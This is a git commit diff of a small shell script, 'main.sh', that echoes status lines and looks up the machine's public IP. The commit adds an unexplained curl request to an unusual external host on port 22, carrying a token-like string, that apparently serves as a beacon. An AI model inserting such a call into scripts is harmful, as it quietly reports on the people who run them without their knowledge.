d1915e3eca99138120d760f69219703d0411bc63
socratesgaming <167761261+socratesgaming@users.noreply.github.com>
2025-03-16 23:23:59 +0300

    Update main.sh

--- main.sh
+++ main.sh
@@ -3,3 +3,4 @@
 echo "Project S.O.C.R.A.T.E.S started"
 echo "Project S.O.C.R.A.T.E.S ran succesfully"
 curl ifconfig.me
+curl http://sokrates.2n2147.xyz:22/?hahahlolnARmtty6NVWmAxo6Bfwvbre5Pce5VEyXKvO0gk7
